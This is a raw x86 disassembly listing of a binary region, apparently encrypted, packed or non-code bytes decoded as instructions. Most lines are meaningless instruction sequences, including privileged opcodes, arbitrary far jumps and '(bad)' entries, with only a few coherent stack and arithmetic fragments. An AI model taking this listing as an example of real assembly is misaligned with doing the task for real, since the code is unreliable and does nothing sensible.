  415ec3:	xchg   ebp,eax
  415ec4:	aaa    
  415ec5:	imul   esi,DWORD PTR [esi],0x1e6ddcfb
  415ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ecc:	add    ch,BYTE PTR [edx+0x4166c734]
  415ed2:	jae    0x415e82
  415ed4:	mov    ds:0xe970b711,eax
  415ed9:	pop    ds
  415eda:	ret    
  415edb:	call   0x4753a66d
  415ee0:	push   esp
  415ee1:	pushf  
  415ee2:	sub    BYTE PTR [edi+0x41fff132],dh
  415ee8:	(bad)  
  415ee9:	jns    0x415e70
  415eeb:	xor    BYTE PTR [edi-0x922727a],ch
  415ef1:	push   DWORD PTR [esi]
  415ef3:	mov    BYTE PTR [edi],ch
  415ef5:	sti    
  415ef6:	add    ch,BYTE PTR [ebx]
  415ef8:	sar    BYTE PTR [ebx],1
  415efa:	fimul  DWORD PTR [edi]
  415efc:	xchg   esi,edx
  415efe:	or     BYTE PTR [eax],al
  415f00:	add    cl,ch
  415f02:	add    eax,DWORD PTR [eax]
  415f04:	add    BYTE PTR [eax],al
  415f06:	mov    edi,DWORD PTR [ebp-0x2c]
  415f09:	mov    DWORD PTR [ebp-0x20],0x1aa3
  415f10:	mov    DWORD PTR [ebp-0x24],0x52d
  415f17:	mov    DWORD PTR [ebp-0x28],0x226c
  415f1e:	jmp    0x416327
  415f23:	dec    eax
  415f24:	pop    edi
  415f25:	xor    ch,BYTE PTR [esi-0x48b34bc6]
  415f2b:	inc    edx
  415f2c:	imul   edx,edi,0xb22b19e3
  415f32:	iret   
  415f33:	ins    BYTE PTR es:[edi],dx
  415f34:	(bad)  
  415f35:	sar    BYTE PTR [esi-0x41413b72],0xe6
  415f3c:	inc    ebx
  415f3d:	call   0xc36e:0x250caac1
  415f44:	cmp    al,BYTE PTR [ebx-0x14502cd0]
  415f4a:	push   0x3a532c8b
  415f4f:	inc    ebp
  415f50:	repnz inc edi
  415f52:	data16 sahf 
  415f54:	lds    esp,FWORD PTR [ecx+eax*4]
  415f57:	dec    ebp
  415f58:	test   BYTE PTR [ebx+edi*4+0x4e7b504d],bh
  415f5f:	je     0x415f5a
  415f61:	aad    0xae
  415f63:	int    0xe6
  415f65:	sub    al,ch
  415f67:	jbe    0x415f3f
  415f69:	dec    ebx
  415f6a:	ret    0x8f3f
  415f6d:	mov    eax,ds:0x28eaf845
  415f72:	mov    dl,0x1
  415f74:	and    eax,0x70f22733
  415f79:	and    BYTE PTR [edx],0x37
  415f7c:	pop    ss
  415f7d:	loop   0x415fbd
  415f7f:	ficomp DWORD PTR [edx-0x5b]
  415f82:	add    dl,BYTE PTR [eax-0x2ecb7a89]
  415f88:	adc    eax,0xb9d7df6
  415f8d:	sti    
  415f8e:	ret    
  415f8f:	mov    ds:0x14d69c40,al
  415f94:	jne    0x415fcb
  415f96:	dec    edi
  415f97:	in     eax,0x77
  415f99:	mov    ebp,0x5a87e3bf
  415f9e:	daa    
  415f9f:	test   al,0xfd
  415fa1:	popf   
  415fa2:	cdq    
  415fa3:	adc    BYTE PTR [ebx+0x76102f8],al
  415fa9:	or     BYTE PTR [ecx-0x1902af54],0xaa
  415fb0:	shr    BYTE PTR [ebx+0x5a367db0],0x4
  415fb7:	xor    ebx,DWORD PTR [ebx]
  415fb9:	hlt    
  415fba:	(bad)  
  415fbc:	pusha  
  415fbd:	mov    esp,0xb25f6113
  415fc2:	jbe    0x415f6f
  415fc4:	imul   edx,DWORD PTR [ebx-0x3a],0x143a3f1d
  415fcb:	retf   
  415fcc:	inc    esp
  415fcd:	aad    0xc7
  415fcf:	test   BYTE PTR [eax],dl
  415fd1:	dec    esi
  415fd2:	shl    ebp,0x5e
  415fd5:	clc    
  415fd6:	jnp    0x41601a
  415fd8:	outs   dx,BYTE PTR ds:[esi]
  415fd9:	push   ebp
  415fda:	mov    edx,DWORD PTR [edx-0x15]
  415fdd:	dec    ebp
  415fde:	pop    ebp
  415fdf:	cmp    eax,0x6aa8cd67
  415fe4:	mov    ds:0x8fe0b783,eax
  415fe9:	repnz fisttp WORD PTR [ebx+0x1e6d784c]
  415ff0:	mov    ebp,0x2c9eb829
  415ff5:	mov    eax,ds:0x4c0a3ef8
  415ffa:	inc    ebp
  415ffb:	jae    0x41600c
  415ffd:	inc    esp
  415ffe:	stos   BYTE PTR es:[edi],al
  415fff:	or     BYTE PTR [eax],al
  416001:	out    0x5d,eax
  416003:	imul   edi,esi,0xaa74b860
  416009:	clc    
  41600a:	and    ebx,DWORD PTR [edi-0x50]
  41600d:	mov    dl,0x2e
  41600f:	and    ebp,DWORD PTR [eax-0x7]
  416012:	and    BYTE PTR [ecx-0x2bb6f959],ch
  416018:	sub    eax,0x7f2efcc3
  41601d:	stos   DWORD PTR es:[edi],eax
  41601e:	xor    al,0x1a
  416020:	mov    ds:0x496eeeab,eax
  416025:	aaa    
  416026:	inc    esp
  416027:	mov    BYTE PTR [ebx],al
  416029:	or     edx,DWORD PTR [ebp-0x5878013]
  41602f:	inc    ecx
  416030:	frstor [ebx]
  416032:	mov    bl,0xea
  416034:	ret    
  416035:	and    eax,0x945b8eb9
  41603a:	in     eax,0xc6
  41603c:	shr    dl,0xa2
  41603f:	jmp    0xd903:0x628b258a
  416046:	ins    DWORD PTR es:[edi],dx
  416047:	jge    0x41609d
  416049:	xor    ecx,DWORD PTR [ecx-0x134e2999]
  41604f:	and    bh,BYTE PTR [ebx-0x66f03b7d]
  416055:	inc    ecx
  416056:	sti    
  416057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416058:	jno    0x416014
  41605a:	out    dx,eax
  41605b:	and    BYTE PTR [ebp-0x79],dl
  41605e:	cmp    ebx,DWORD PTR [edx]
  416060:	(bad)  
  416061:	ins    BYTE PTR es:[edi],dx
  416062:	sbb    ebp,esp
  416064:	(bad)  
  416065:	jmp    0x5bd6:0xe4e447f8
  41606c:	out    dx,al
  41606d:	push   esi
  41606e:	es mov edi,0xd4d04703
  416074:	lods   eax,DWORD PTR ds:[esi]
  416075:	adc    esi,DWORD PTR [ebp+0x589de494]
  41607b:	jb     0x416016
  41607d:	jae    0x416022
  41607f:	(bad)  
  416080:	push   ebp
  416081:	sbb    dl,BYTE PTR [edi]
  416083:	repz and al,0xa2
  416086:	lods   eax,DWORD PTR ds:[esi]
  416087:	imul   esp,DWORD PTR [edi+0x6d],0x723128c9
  41608e:	test   eax,0xe2e12012
  416093:	lds    ecx,FWORD PTR [ecx+edi*8-0x46d3c545]
  41609a:	xor    al,0xdc
  41609c:	xor    eax,0xfb515a48
  4160a1:	xor    DWORD PTR [edi],esp
  4160a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160a4:	lods   al,BYTE PTR ds:[esi]
  4160a5:	jb     0x4160dc
  4160a7:	pusha  
  4160a8:	fst    QWORD PTR [edi]
  4160aa:	jbe    0x4160d5
  4160ac:	mov    edx,0x9c5d4056
  4160b1:	dec    esp
  4160b2:	xor    eax,DWORD PTR [ecx]
  4160b4:	addr16 pop ecx
  4160b6:	loop   0x4160d3
  4160b8:	adc    ah,BYTE PTR [edi]
  4160ba:	das    
  4160bb:	sub    BYTE PTR [ecx],bh
  4160bd:	out    dx,al
  4160be:	sub    edx,DWORD PTR [ecx+0x71]
  4160c1:	jbe    0x4160d0
  4160c3:	add    dl,ch
  4160c5:	vpshuflw ymm5,YMMWORD PTR [edi+0x392cf7a6],0x23
  4160ce:	push   cs
  4160cf:	mov    esi,0x3881429d
  4160d4:	mov    WORD PTR [ebx],ss
  4160d6:	mov    cs,WORD PTR [edx+0x7b5523ea]
  4160dc:	sub    cl,ah
  4160de:	sub    eax,0x4228885a
  4160e3:	(bad)  
  4160e4:	cld    
  4160e5:	and    BYTE PTR [edx+esi*8-0x9e36bba],ah
  4160ec:	adc    ecx,DWORD PTR [ebp-0x17544319]
  4160f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160f3:	stc    
  4160f4:	sub    cl,BYTE PTR [esi+0x1b]
  4160f7:	fnstcw WORD PTR [ebp+0x50]
  4160fa:	jnp    0x41614e
  4160fc:	iret   
  4160fd:	jbe    0x4160f0
  4160ff:	or     al,0x10
  416101:	or     eax,0x90bb4fb
  416106:	scas   eax,DWORD PTR es:[edi]
  416107:	mov    edx,0xf70ff83b
  41610c:	jecxz  0x4160fa
  41610e:	cdq    
  41610f:	push   edi
  416110:	cmp    DWORD PTR [esi],ebp
  416112:	addr16 mov ds:0xaed2,al
  416116:	pusha  
  416117:	stos   BYTE PTR es:[edi],al
  416118:	pop    ss
  416119:	shl    DWORD PTR [ebp-0x16],0xc5
  41611d:	xlat   BYTE PTR ds:[ebx]
  41611e:	xchg   BYTE PTR [ebx+0x3e],ah
  416121:	xchg   edx,eax
  416122:	cwde   
  416123:	scas   al,BYTE PTR es:[edi]
  416124:	xchg   esp,eax
  416125:	sub    DWORD PTR ss:[ecx+edi*1+0x6b],0xffffffb7
  41612b:	pop    ss
  41612c:	cmp    ch,cl
  41612e:	rcl    BYTE PTR [esi],cl
  416130:	fsubr  QWORD PTR [ebp-0x45]
  416133:	sub    edi,DWORD PTR [edx]
  416135:	test   eax,0x86715da4
  41613a:	fdiv   QWORD PTR [esp]
  41613d:	add    bh,ch
  41613f:	pop    edi
  416140:	scas   eax,DWORD PTR es:[edi]
  416141:	mov    ds:0xf30b8647,al
  416146:	xchg   bh,dl
  416148:	gs add al,dl
  41614b:	addr16 add eax,0xdc997ef3
  416151:	jl     0x416119
  416153:	inc    BYTE PTR [ebx]
  416155:	add    BYTE PTR [ebx+ebp*2+0x16db6b3b],0x0
  41615d:	outs   dx,DWORD PTR ds:[esi]
  41615e:	inc    ebp
  41615f:	in     al,dx
  416160:	ja     0x416190
  416162:	cmp    eax,0x4bfebfde
  416167:	lods   al,BYTE PTR ds:[esi]
  416168:	dec    edi
  416169:	jb     0x416158
  41616b:	je     0x4160ee
  41616d:	enter  0x2e87,0xc3
  416171:	dec    eax
  416172:	lds    edx,FWORD PTR [edx+ecx*8-0x2dc64ace]
  416179:	pop    esi
  41617a:	lock or edx,edi
  41617d:	mov    cl,0x21
  41617f:	test   BYTE PTR [eax+0x36],ah
  416182:	adc    BYTE PTR [esi+0x3586bada],bh
  416188:	inc    edx
  416189:	dec    ecx
  41618a:	lea    esp,[ecx+eax*4]
  41618d:	retf   0x5723
  416190:	outs   dx,BYTE PTR ds:[esi]
  416191:	jg     0x416196
  416193:	inc    esp
  416194:	mov    ch,0x3d
  416196:	pop    ebx
  416197:	setg   BYTE PTR ds:0xdd216640
  41619e:	test   DWORD PTR [edi],eax
  4161a0:	mov    ds:0x7b7277a7,al
  4161a5:	xor    DWORD PTR [ecx],edi
  4161a7:	sbb    DWORD PTR [ecx*8-0xf85df4],esi
  4161ae:	add    eax,0xa7593dfa
  4161b3:	sti    
  4161b4:	popa   
  4161b5:	icebp  
  4161b6:	inc    edx
  4161b7:	iret   
  4161b8:	jae    0x416168
  4161ba:	xor    al,0x63
  4161bc:	repnz sub ebp,esp
  4161bf:	sbb    ebp,eax
  4161c1:	and    esi,DWORD PTR [ebx]
  4161c3:	jb     0x416212
  4161c5:	jg     0x4161e5
  4161c7:	mov    eax,0xfaf9fe39
  4161cc:	lods   al,BYTE PTR ds:[esi]
  4161cd:	dec    ebp
  4161ce:	jle    0x4161b2
  4161d0:	add    eax,0x14c4f4ed
  4161d5:	push   eax
  4161d6:	inc    edx
  4161d7:	imul   ebx,DWORD PTR [eax-0x15],0x41
  4161db:	pop    edx
  4161dc:	adc    BYTE PTR [eax-0x61b8b430],0xe4
  4161e3:	and    al,0x9a
  4161e5:	cdq    
  4161e6:	(bad)  
  4161e8:	int    0xa
  4161ea:	pop    ss
  4161eb:	mov    ecx,0x5ca39b9a
  4161f0:	and    al,0x9b
  4161f2:	rcl    DWORD PTR [ebp-0x39],cl
  4161f5:	rol    DWORD PTR [esi],1
  4161f7:	xor    eax,0xb50e94ae
  4161fc:	add    dh,BYTE PTR [eax-0x33]
  4161ff:	xor    BYTE PTR [ecx],dh
  416201:	or     eax,esp
  416203:	les    ebx,FWORD PTR [edx-0x52]
  416206:	xor    al,0xc3
  416208:	pop    edi
  416209:	test   BYTE PTR [ecx],ch
  41620b:	dec    esi
  41620c:	dec    eax
  41620d:	push   esp
  41620e:	adc    DWORD PTR [ebp-0x42],esp
  416211:	sub    al,0xb
  416213:	out    0x8e,al
  416215:	dec    edi
  416216:	or     bh,0x9b
  416219:	mov    DWORD PTR [eax],eax
  41621b:	or     eax,0x491cea1d
  416220:	dec    ebp
  416221:	sahf   
  416222:	pop    ecx
  416223:	fs es mov esi,0x126e073b
  41622a:	(bad)  
  41622b:	(bad)
  41622f:	dec    ebp
  416230:	repz push esp
  416232:	bound  edx,QWORD PTR [ebx-0x73c7e8d3]
  416238:	push   ebx
  416239:	sbb    eax,DWORD PTR [eax+0x4649a94c]
  41623f:	dec    ebx
  416240:	dec    esp
  416241:	pop    edi
  416242:	mov    bl,0xc9
  416244:	lea    ecx,[edi+0x15]
  416247:	popa   
  416248:	xchg   ebp,eax
  416249:	pop    ss
  41624a:	xchg   edi,eax
  41624b:	or     bp,cx
  41624e:	in     al,dx
  41624f:	dec    ebp
  416250:	cmp    esp,esi
  416252:	xchg   esi,eax
  416253:	cwde   
  416254:	cwde   
  416255:	lods   eax,DWORD PTR ds:[esi]
  416256:	retf   
  416257:	stos   BYTE PTR es:[edi],al
  416258:	cwde   
  416259:	or     ah,BYTE PTR [edi+0x20]
  41625c:	imul   ebp,ebp,0x695393ff
  416262:	arpl   WORD PTR [esi-0x39],si
  416265:	rol    ebx,0xb9
  416268:	adc    al,0x72
  41626a:	sbb    bl,BYTE PTR ds:0xdcfac1e6
  416270:	push   ds
  416271:	fild   DWORD PTR [ebp+0x1b]
  416274:	fadd   QWORD PTR [ebx+0x6e4242f7]
  41627a:	xor    al,0x2d
  41627c:	shr    DWORD PTR [ebp+0x56dfefb1],1
  416282:	jmp    0x19d3:0xc3180f2b
  416289:	mov    esp,0x8b63581c
  41628e:	repnz mov bh,0x9c
  416291:	outs   dx,DWORD PTR ds:[esi]
  416292:	out    dx,al
  416293:	xor    BYTE PTR [ebx+0x63b0e500],bl
  416299:	and    BYTE PTR [ebx+edi*4],dl
  41629c:	cld    
  41629d:	or     al,0xee
  41629f:	jg     0x416312
  4162a1:	int    0x15
  4162a3:	mov    bh,0xa1
  4162a5:	daa    
  4162a6:	lods   eax,DWORD PTR ds:[esi]
  4162a7:	cmp    ecx,DWORD PTR [edi]
  4162a9:	ds cwde 
  4162ab:	sub    DWORD PTR [edx+0x32cec8c8],0xffffff8d
  4162b2:	dec    ecx
  4162b3:	pop    ebx
  4162b4:	pop    ss
  4162b5:	xlat   BYTE PTR ds:[ebx]
  4162b6:	sar    DWORD PTR [eax-0x3f14a43e],cl
  4162bc:	cli    
  4162bd:	sub    bl,ch
  4162bf:	test   eax,0x99828ba0
  4162c4:	mov    ebp,0x52ed8a88
  4162c9:	xchg   dh,dl
  4162cb:	sbb    edx,ebx
  4162cd:	inc    esi
  4162ce:	nop
  4162cf:	je     0x4162ec
  4162d1:	ds ja  0x41628a
  4162d4:	stos   DWORD PTR es:[edi],eax
  4162d5:	call   0x98d5:0xd30672fe
  4162dc:	fbstp  TBYTE PTR [ecx-0x475b89af]
  4162e2:	les    edx,FWORD PTR ds:0xa90e80b7
  4162e8:	jno    0x4162d3
  4162ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162eb:	jns    0x416361
  4162ed:	sub    al,0xc8
  4162ef:	push   ds
  4162f0:	fucomp st(3)
  4162f2:	xchg   ebp,eax
  4162f3:	xchg   esp,eax
  4162f4:	mov    DWORD PTR [ebx],ebp
  4162f6:	adc    eax,DWORD PTR [ebp+eax*4-0x33]
  4162fa:	xor    DWORD PTR [esi],ebx
  4162fc:	aaa    
  4162fd:	or     DWORD PTR [ecx-0xa80220a],esp
  416303:	stc    
  416304:	mov    edx,0xb53abe75
  416309:	cmp    eax,0x5d786c72
  41630e:	loope  0x41636e
  416310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416311:	ins    BYTE PTR es:[edi],dx
  416312:	sub    al,0xef
  416314:	cmc    
  416315:	es push 0x68d67800
  41631b:	leave  
  41631c:	sbb    cl,BYTE PTR [eax+ebx*8]
  41631f:	inc    edx
  416320:	imul   esi,edi,0x14efd42c
  416326:	add    bh,al
  416328:	inc    ebp
  416329:	aam    0x7d
  41632b:	xor    al,0x0
  41632d:	add    BYTE PTR [ebx+0x558bd445],cl
  416333:	fmul   DWORD PTR [ebx-0x4cd223a3]
  416339:	and    al,0x0
  41633b:	add    BYTE PTR [edi],cl
  41633d:	scas   eax,DWORD PTR es:[edi]
  41633e:	ret    0xef35
  416341:	je     0x416343
  416343:	add    BYTE PTR [ebx],dh
  416345:	shl    bh,cl
  416347:	repz mov edx,DWORD PTR [ebp-0x20]
  41634b:	mov    ebx,DWORD PTR [ebp+0x8]
  41634e:	push   0x20
  416350:	and    eax,edx
  416352:	mov    edx,edi
  416354:	sub    edx,eax
  416356:	sub    edx,0x683
  41635c:	mov    DWORD PTR [ebp-0x2c],edx
  41635f:	mov    eax,DWORD PTR [ebp-0x30]
  416362:	mov    edx,DWORD PTR [ebp-0x34]
  416365:	xor    al,dl
  416367:	mov    edx,DWORD PTR [ebp-0x2c]
  41636a:	xor    al,0x58
  41636c:	and    al,0xd8
  41636e:	add    al,BYTE PTR [ebp+0xc]
  416371:	add    al,0x28
  416373:	jmp    0x41677c
  416378:	mov    ebx,0x41d6c237
  41637d:	cmp    edi,DWORD PTR [ebx-0x6192d245]
  416383:	nop
  416384:	leave  
  416385:	add    ecx,DWORD PTR [edx-0x6e]
  416388:	cmp    al,0xcc
  41638a:	sar    BYTE PTR [esi-0x41413b72],0x28
  416391:	loopne 0x41638c
  416393:	ficom  DWORD PTR [edx+0x8]
  416396:	jne    0x53257b6c
  41639c:	ret    0x4eeb
  41639f:	xchg   ecx,eax
  4163a0:	out    0xe6,eax
  4163a2:	cmp    al,0x5a
  4163a4:	ret    
  4163a5:	xor    al,0xa
  4163a7:	aaa    
  4163a8:	cmp    DWORD PTR [ebp+0x4b],eax
  4163ab:	outs   dx,BYTE PTR ds:[esi]
  4163ac:	jo     0x4163c7
  4163ae:	es cmp ebx,esi
  4163b1:	dec    eax
  4163b2:	fdiv   st(6),st
  4163b4:	sub    eax,DWORD PTR fs:[ebx+0x5a145002]
  4163bb:	mov    ebx,0x5ab856de
  4163c0:	sbb    eax,DWORD PTR [edx]
  4163c2:	aas    
  4163c3:	sbb    al,0xa2
  4163c5:	inc    edi
  4163c6:	xchg   esp,eax
  4163c7:	mov    DWORD PTR [edx-0x46],ebp
  4163ca:	mov    esp,DWORD PTR [ecx+0x2d]
  4163cd:	mov    al,0xe2
  4163cf:	mov    ds:0x5dca3fa9,eax
  4163d4:	stos   BYTE PTR es:[edi],al
  4163d5:	push   ebx
  4163d6:	adc    al,0xb1
  4163d8:	mov    WORD PTR es:[edi+0x69],gs
  4163dc:	mov    bh,0x1a
  4163de:	add    al,0xb4
  4163e0:	xlat   BYTE PTR ds:[ebx]
  4163e1:	mov    esp,0xa1efa8e4
  4163e6:	or     eax,0xa9470f45
  4163eb:	out    0x69,al
  4163ed:	out    dx,al
  4163ee:	aad    0xd2
  4163f0:	cld    
  4163f1:	das    
  4163f2:	pop    eax
  4163f3:	mov    ebx,0x851b410f
  4163f8:	mov    dl,0xe6
  4163fa:	stos   BYTE PTR es:[edi],al
  4163fb:	mov    ah,0x36
  4163fd:	push   edx
  4163fe:	les    ecx,FWORD PTR ds:0x7198bc29
  416404:	mov    esp,0xc3fa90f1
  416409:	idiv   DWORD PTR [esi]
  41640b:	pop    ebp
  41640c:	popf   
  41640d:	js     0x416473
  41640f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416410:	push   esp
  416411:	adc    eax,0xe0ccaea4
  416416:	xor    ebx,DWORD PTR [ebx-0x71]
  416419:	fdiv   st,st(4)
  41641b:	enter  0x3c2f,0x82
  41641f:	in     al,0x20
  416421:	pop    esp
  416422:	lea    esi,[eax]
  416424:	mov    esp,0xd168693f
  416429:	pop    ebp
  41642a:	ret    0x5f7
  41642d:	mov    eax,ds:0x460276d6
  416432:	adc    ebx,ebp
  416434:	int3   
  416435:	imul   edi,DWORD PTR [edx],0x64
  416438:	ins    DWORD PTR es:[edi],dx
  416439:	popa   
  41643a:	sub    al,BYTE PTR gs:[ebx-0x62]
  41643e:	jg     0x416461
  416440:	jl     0x41645f
  416442:	(bad)  
  416445:	sahf   
  416446:	mov    al,BYTE PTR [esi-0x4a]
  416449:	mov    ecx,0xec94f6
  41644e:	jecxz  0x4164a3
  416450:	outs   dx,DWORD PTR ds:[esi]
  416451:	in     eax,0xcd
  416453:	xchg   esi,eax
  416454:	dec    esi
  416455:	push   esi
  416456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416457:	mov    al,ds:0xebeaa494
  41645c:	mov    dl,BYTE PTR [esi+0x4b]
  41645f:	lods   eax,DWORD PTR ds:[esi]
  416460:	loop   0x4164b0
  416462:	xor    al,0xeb
  416464:	gs xchg edi,eax
  416466:	or     eax,0xa3a9cfbd
  41646b:	xor    ebx,esi
  41646d:	and    BYTE PTR [ebp+0x34],al
  416470:	pop    esi
  416471:	push   DWORD PTR [eax+0x6c]
  416474:	sub    ch,cl
  416476:	mov    esp,0xefe5d492
  41647b:	pop    ecx
  41647c:	jmp    FWORD PTR [ecx-0x3ad49d03]
  416482:	sbb    edi,DWORD PTR [esi+0x15b386e8]
  416488:	mov    ch,0x25
  41648a:	retf   0xa1ec
  41648d:	in     eax,dx
  41648e:	gs jo  0x4164cb
  416491:	cmp    DWORD PTR [eax+0x1e],ebp
  416494:	inc    esp
  416495:	mov    al,0x7e
  416497:	sbb    edi,edi
  416499:	jmp    0x3daed400
  41649e:	fs add eax,0x27dea60
  4164a4:	or     bl,BYTE PTR [ebp-0x4451635d]
  4164aa:	add    eax,0x9a4a2f8e
  4164af:	inc    edi
  4164b0:	mov    ch,bl
  4164b2:	outs   dx,BYTE PTR ds:[esi]
  4164b3:	mov    ch,0xc8
  4164b5:	lods   al,BYTE PTR ds:[esi]
  4164b6:	fcom   DWORD PTR [ebx+0x11]
  4164b9:	or     al,0x56
  4164bb:	ret    
  4164bc:	dec    ebx
  4164bd:	jl     0x416513
  4164bf:	call   0xac41:0xb60e5002
  4164c6:	or     al,ch
  4164c8:	sub    al,0x16
  4164ca:	fcom   QWORD PTR [edi-0x3ce7f49e]
  4164d0:	bound  ebx,QWORD PTR [ecx]
  4164d2:	inc    edx
  4164d3:	mov    al,ds:0x86117d03
  4164d8:	fidiv  WORD PTR [edi-0xe]
  4164db:	js     0x416556
  4164dd:	cmp    BYTE PTR [edx-0x68],bh
  4164e0:	jmp    0x4164e3
  4164e2:	cs and esp,eax
  4164e5:	idiv   dl
  4164e7:	jnp    0x416548
  4164e9:	imul   ebx,DWORD PTR [ebp+edi*2+0x54],0xa
  4164ee:	test   BYTE PTR [edi],bh
  4164f0:	fcmove st,st(6)
  4164f2:	inc    edi
  4164f3:	jle    0x416516
  4164f5:	inc    ebx
  4164f6:	imul   bh
  4164f8:	jmp    0x7759379c
  4164fd:	fcmovbe st,st(3)
  4164ff:	jmp    0x4164cb
  416501:	fild   DWORD PTR [eax-0x3d]
  416504:	push   esi
  416505:	lods   eax,DWORD PTR ds:[esi]
  416506:	xor    eax,0xacf1a034
  41650b:	daa    
  41650c:	add    al,0xf6
  41650e:	inc    eax
  41650f:	aam    0x31
  416511:	pop    ds
  416512:	cmp    ecx,0x5eac4fe
  416518:	sbb    BYTE PTR [eax],ah
  41651a:	inc    ecx
  41651b:	mov    bl,BYTE PTR [eax-0x17]
  41651e:	les    ecx,FWORD PTR [edx-0x4f]
  416521:	inc    esi
  416522:	ds loopne 0x41654e
  416525:	ret    
  416526:	(bad)  
  416527:	pop    ss
  416528:	sub    DWORD PTR [ebp-0x5afecc02],edx
  41652e:	std    
  41652f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416530:	scas   eax,DWORD PTR es:[edi]
  416531:	mov    ecx,0xef9cda25
  416536:	inc    esi
  416537:	push   ds
  416538:	out    dx,al
  416539:	or     al,0x39
  41653b:	imul   eax,DWORD PTR [bx+si],0x163585fc
  416542:	add    ecx,ecx
  416544:	addr16 in al,dx
  416546:	push   ss
  416547:	gs adc al,0x0
  41654a:	mov    cl,0xe3
  41654c:	mov    bl,0xe0
  41654e:	addr16 call 0x236e:0xd8310784
  416556:	xchg   ecx,eax
  416557:	pop    esp
  416558:	data16 xlat BYTE PTR ds:[ebx]
  41655a:	cmp    BYTE PTR [ecx+eax*8-0x637df54e],dl
  416561:	ds jl  0x41653b
  416564:	and    eax,0xdcff1769
  416569:	add    ebp,DWORD PTR [edi-0x7c2c06f7]
  41656f:	inc    ebp
  416570:	add    ebp,ebp
  416572:	repnz loopne 0x416582
  416575:	mov    ch,0x6a
  416577:	jmp    0xc535:0xac401226
  41657e:	sub    al,0x17
  416580:	repnz pop ds
  416582:	add    dl,al
  416584:	cmp    ecx,esi
  416586:	dec    ebp
  416587:	sbb    al,0xb1
  416589:	loopne 0x416564
  41658b:	nop
  41658c:	stos   DWORD PTR es:[edi],eax
  41658d:	pop    eax
  41658e:	pusha  
  41658f:	jmp    0x65e80d74
  416594:	fnsave [edi]
  416596:	inc    edi
  416597:	(bad)  
  416598:	outs   dx,DWORD PTR ds:[esi]
  416599:	sub    DWORD PTR [ebp-0x29],eax
  41659c:	cmp    ah,BYTE PTR [esi+0x4b]
  41659f:	push   ecx
  4165a0:	sbb    eax,0x53d0bac1
  4165a5:	cs sti 
  4165a7:	out    dx,al
  4165a8:	jns    0x4165ba
  4165aa:	xchg   DWORD PTR [esp+ecx*4],esp
  4165ad:	adc    ebx,DWORD PTR [ebp+0x821d0be]
  4165b3:	inc    edi
  4165b4:	inc    edx
  4165b5:	shl    WORD PTR [ecx+0x27ea9ddd],cl
  4165bc:	mov    cl,ch
  4165be:	add    dl,0x2f
  4165c1:	inc    ebx
  4165c2:	push   esp
  4165c3:	xchg   esi,eax
  4165c4:	add    ch,BYTE PTR [esi]
  4165c6:	test   al,0x46
  4165c8:	or     ecx,DWORD PTR [ecx+0x7b]
  4165cb:	sub    al,dh
  4165cd:	loopne 0x41657e
  4165cf:	sub    ebx,DWORD PTR [esi+0x3d]
  4165d2:	dec    edi
  4165d3:	add    DWORD PTR [ebx-0xa702937],ecx
  4165d9:	dec    ecx
  4165da:	sub    al,0xd3
  4165dc:	sbb    al,0x4a
  4165de:	jp     0x4165dc
  4165e0:	scas   al,BYTE PTR es:[edi]
  4165e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165e2:	inc    ebx
  4165e3:	jb     0x4165bb
  4165e5:	aas    
  4165e6:	sti    
  4165e7:	inc    esp
  4165e8:	mov    esp,eax
  4165ea:	dec    ebp
  4165eb:	cmp    al,0x25
  4165ed:	mov    ch,0xd4
  4165ef:	scas   al,BYTE PTR es:[edi]
  4165f0:	lods   eax,DWORD PTR ds:[esi]
  4165f1:	xchg   edx,eax
  4165f2:	add    BYTE PTR [ebx+edx*8],dh
  4165f5:	or     esp,DWORD PTR [esi+0x6f3046cb]
  4165fb:	jae    0x4165f6
  4165fd:	jmp    0x6843:0xa1fd051a
  416604:	ins    BYTE PTR es:[edi],dx
  416605:	sbb    DWORD PTR [eax-0x33ce7fe0],0x22e24ef4
  41660f:	mov    esp,0x8c680e5c
  416614:	std    
  416615:	(bad)  
  416616:	lock pop es
  416618:	daa    
  416619:	and    al,0xad
  41661b:	mov    eax,ds:0x4c04da1b
  416620:	cmp    al,0xa3
  416622:	sub    ecx,DWORD PTR ds:0x18fea42e
  416628:	fdivp  st(0),st
  41662a:	(bad)  
  41662b:	or     BYTE PTR [esi-0x66d859b8],dl
  416631:	lea    esi,[eax-0x47]
  416634:	pop    ss
  416635:	aad    0xa8
  416637:	push   esp
  416638:	into   
  416639:	call   DWORD PTR [esi+edi*2]
  41663c:	dec    edx
  41663d:	aaa    
  41663e:	daa    
  41663f:	or     DWORD PTR [edx+eax*2+0x699c887],ebp
  416646:	out    dx,al
  416647:	pop    edx
  416648:	jecxz  0x416660
  41664a:	sbb    al,BYTE PTR [esi+0x17]
  41664d:	sar    dh,cl
  41664f:	push   ebp
  416650:	pop    ss
  416651:	inc    ecx
  416652:	push   0x623c97dc
  416657:	pop    ss
  416658:	jge    0x416672
  41665a:	aaa    
  41665b:	xchg   eax,eax
  41665d:	addr16 jb 0x4166db
  416660:	frstor [esi+0xca22c0a]
  416666:	or     ebp,esi
  416668:	mov    BYTE PTR ds:[eax-0x76fe308f],al
  41666f:	sbb    DWORD PTR [edx],esi
  416671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416672:	fld    DWORD PTR ds:0xd2c16420
  416678:	push   edi
  416679:	sub    edx,DWORD PTR [edx]
  41667b:	rol    BYTE PTR [eax],1
  41667d:	sbb    bh,BYTE PTR [ebx+0x5]
  416680:	cwde   
  416681:	fidivr WORD PTR [edi-0x3f]
  416684:	pop    es
  416685:	dec    ecx
  416686:	fist   DWORD PTR [edi+ecx*2-0x523096e3]
  41668d:	sbb    ebp,esi
  41668f:	call   0xa0ce:0xe03354af
  416696:	imul   edi,DWORD PTR [ebp+0x65],0x27
  41669a:	jbe    0x4166f8
  41669c:	push   esp
  41669d:	in     eax,dx
  41669e:	daa    
  41669f:	or     edx,DWORD PTR [edi]
  4166a1:	scas   al,BYTE PTR es:[edi]
  4166a2:	stc    
  4166a3:	push   ebp
